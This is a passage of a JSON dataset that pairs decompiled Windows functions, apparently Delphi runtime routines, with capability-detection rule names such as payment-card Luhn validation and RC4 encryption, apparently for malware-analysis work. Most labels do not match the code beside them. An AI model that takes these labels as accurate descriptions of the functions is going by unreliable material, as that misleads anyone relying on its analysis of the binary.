        "decompiled_code": "\nvoid __fastcall fcn.00404270(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    if (*in_EAX != 0) {\n        if (param_2 == *in_EAX) {\n            fcn.004045f4();\n        }\n        else {\n            fcn.004045f4();\n        }\n        fcn.004028b8();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.0040406c(param_2);\n            fcn.004028b8();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.004026dc();\n        }\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "004042b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004042b4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    \n    iVar3 = param_1;\n    if ((param_2 != 0) && (iVar3 = param_2,  param_1 != 0)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                iVar3 = fcn.0040406c();\n                fcn.004028b8();\n                fcn.004028b8();\n                if (iVar3 != 0) {\n                    *(iVar3 + -8) = *(iVar3 + -8) + -1;\n                }\n                fcn.00403ffc();\n                return;\n            }\n            fcn.00403ffc();\n        }\n        if (param_1 == 0) {\n            return;\n        }\n        iVar3 = param_1;\n        if (*in_EAX != 0) {\n            if (param_1 == *in_EAX) {\n                fcn.004045f4();\n            }\n            else {\n                fcn.004045f4();\n            }\n            fcn.004028b8();\n            return;\n        }\n    }\n    if (iVar3 != 0) {\n        iVar2 = *(iVar3 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            iVar3 = fcn.0040406c(iVar3);\n            fcn.004028b8();\n        }\n        else {\n            LOCK();\n            *(iVar3 + -8) = *(iVar3 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = iVar3;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.004026dc();\n        }\n    }\n    return;\n}\n",
        "token_count": 496
    },
    "00404328": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404328(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar3 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    iVar2 = param_2;\n    if ((piVar1 != NULL) && (*in_EAX == piVar1)) {\n        iVar2 = param_2 + -1;\n        piVar3 = piVar1;\n    }\n    do {\n        if ((*(&stack0x00000000 + iVar2 * 4) != NULL) && (piVar3 == *(&stack0x00000000 + iVar2 * 4))) {\n            piVar3 = NULL;\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    if (piVar3 == NULL) {\n        iStack24 = fcn.0040406c();\n    }\n    else {\n        fcn.004045f4();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar3 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.004028b8();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar3 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.00403ffc();\n    }\n    // WARNING: Could not recover jumptable at 0x004043af. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 463
    },
    "004044c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004044c8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.00403fa8();\n    }\n    else {\n        fcn.00404098();\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00404508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404508(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004044b8();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.004028b8();\n            fcn.004045f4();\n        }\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00404550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404550(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.004045f4();\n        fcn.004028b8();\n        fcn.004028b8();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004046a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046a0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 128
    },
    "004047d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004047d4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4);\n    }\n    if (arg_8h < 1) {\n        fcn.00404688(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.004040e8(arg_8h),  0 < iVar1)) {\n        fcn.00404774();\n    }\n    else {\n        fcn.004048d0();\n        fcn.004040e8(arg_8h);\n        fcn.004048d0();\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "004048d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004048d0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (0 < param_2) {\n        fcn.00404660();\n        iVar1 = fcn.004047f4();\n        if (0 < iVar1) {\n            fcn.004028b8();\n        }\n    }\n    fcn.00404678();\n    return;\n}\n",
        "token_count": 96
    },
    "00404914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404914(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00404944();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 122
    },
    "004049e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004049e4(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00404a30();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 124
    },
    "00404d7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00404d7c(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 101
    },
    "00404f5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404f5c(void)\n\n{\n    fcn.00404dd0(&stack0x00000004);\n    return;\n}\n",
        "token_count": 33
    },
    "00404fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00404fcc(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 84
    },
    "00405b0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405b0c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack1032 [1024];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00405044(*(in_EAX + 4), auStack1032, 0x400);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.00404098();\n        }\n        else {\n            fcn.004041a0();\n        }\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00405e64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e64(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 113
    },
    "00407b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407b70(uint param_1, uint8_t **param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    iVar2 = fcn.00404268();\n    fcn.004045f4();\n    puVar3 = *param_2;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        uVar1 = *in_EAX;\n        if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n            uVar1 = uVar1 + 0x20;\n        }\n        *puVar3 = uVar1;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00407e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407e50(uint param_1, uint param_2)\n\n{\n    fcn.00407e04(param_2);\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 46
    },
    "00407e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407e70(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00407ea4(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 515
    },
    "00407f3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407f3c(uint arg_8h)\n\n{\n    fcn.00407e70();\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 40
    },
    "00407f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407f64(uint param_1)\n\n{\n    fcn.00407e04(param_1);\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 41
    },
    "00408000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408000(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404da0();\n    if (iVar1 == 0) {\n        fcn.00404f5c(1);\n        fcn.00403ffc();\n    }\n    iVar1 = fcn.00404da0();\n    if (iVar1 == 0) {\n        fcn.00404f5c(1);\n        fcn.00403ffc();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00408090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00408090(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0;\n    if (-1 < in_EDX) {\n        iVar1 = in_EDX + 1;\n        do {\n            in_EAX = fcn.00407d18();\n            if (in_EAX != '\\0') {\n                _auStack8 = 0x1000000;\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return in_EAX & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 193
    },
    "004080cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004080cc(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.00409444();\n    if (uVar1 == '\\0') {\n        fcn.00408000();\n        fcn.00404da8();\n        uVar1 = fcn.00408090(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.00404da8();\n            uVar1 = fcn.00408090(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x40814c;\n    }\n    return uVar1;\n}\n",
        "token_count": 262
    },
    "00408210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408210(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x40822a;\n    fcn.00404914();\n    uStack28 = 0x408276;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00403fa8();\n    fcn.004054a8();\n    fcn.00403ffc();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x40827d;\n    uStack28 = 0x408275;\n    fcn.004049e4();\n    return;\n}\n",
        "token_count": 189
    },
    "00408374": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00408374(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    uVar1 = sub.kernel32.dll_SetFilePointer();\n    return CONCAT44(arg_ch, uVar1);\n}\n",
        "token_count": 68
    },
    "0040852c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040852c(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.00404468(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 84
    },
    "00408568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408568(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(arg_8h, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.00404d7c(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.00404d7c(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 249
    },
    "004087dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004087dc(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.004026bc();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 67
    },
    "00408ccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ccc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint var_1008h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404268();\n    if (iVar1 < 0xc00) {\n        uVar2 = fcn.00404268();\n        iVar3 = fcn.004088c0(arg_8h, in_ECX, uVar2);\n        iVar1 = 0x1000;\n    }\n    else {\n        iVar3 = fcn.00404268();\n        iVar1 = iVar3;\n    }\n    if (iVar3 < iVar1 + -1) {\n        fcn.00404098();\n    }\n    else {\n        for (; iVar1 + -1 <= iVar3; iVar1 = iVar1 * 2) {\n            fcn.00403fa8();\n            fcn.004045f4();\n            uVar2 = fcn.00404268();\n            iVar3 = fcn.004088c0(arg_8h, in_ECX, uVar2);\n        }\n        fcn.004045f4();\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "00409392": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409392(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "004093ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004093ae(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 168
    },
    "004093e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004093e4(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.00408dd0(0, 0xf, 0);\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 56
    },
    "00409414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409414(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.00408dd0(0, 0, 0);\n    fcn.00404098();\n    return;\n}\n",
        "token_count": 54
    },
    "00409460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409460(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.00404468();\n    cVar1 = fcn.004092d0();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0040948c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040948c(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.00404468();\n    cVar1 = fcn.004092d0();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004094d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004094d4(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x46117c);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x461180;\n        iVar2 = -(uVar1 / *0x461180);\n    }\n    else {\n        iVar2 = uVar1 / *0x461180;\n        uVar3 = uVar1 % *0x461180;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 233
    },
    "00409518": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00409518(double *arg_8h, uint arg_ch)\n\n{\n    double *in_EAX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_EAX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = ((in_EAX & 0xffff) * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x409584;\n        var_1h._0_1_ = 1;\n        in_EAX = arg_8h;\n    }\n    return in_EAX & 0xffffff00 | var_1h;\n}\n",
        "token_count": 236
    },
    "00409588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409588(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004094d4(arg_ch, arg_10h, &var_4h);\n    fcn.00407a70(arg_ch);\n    fcn.00407a70(in_EDX);\n    fcn.00407a70(arg_8h);\n    return;\n}\n",
        "token_count": 108
    },
    "004096e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004096e8(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.004094d4(arg_ch, arg_10h);\n    if (var_14h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_14h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_14h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.00407a70(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.00407a70(&var_eh);\n        fcn.00407a70(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.004095e4();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x4610da + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 605
    },
    "00409854": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409854(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.004094d4(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 70
    },
    "0040987c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t fcn.0040987c(void)\n\n{\n    int16_t iStack20;\n    \n    iStack20 = *0x10 + -0x10;\n    sub.kernel32.dll_GetLocalTime();\n    return iStack20;\n}\n",
        "token_count": 54
    },
    "00409890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409890(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.004028b8();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 129
    },
    "004098f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
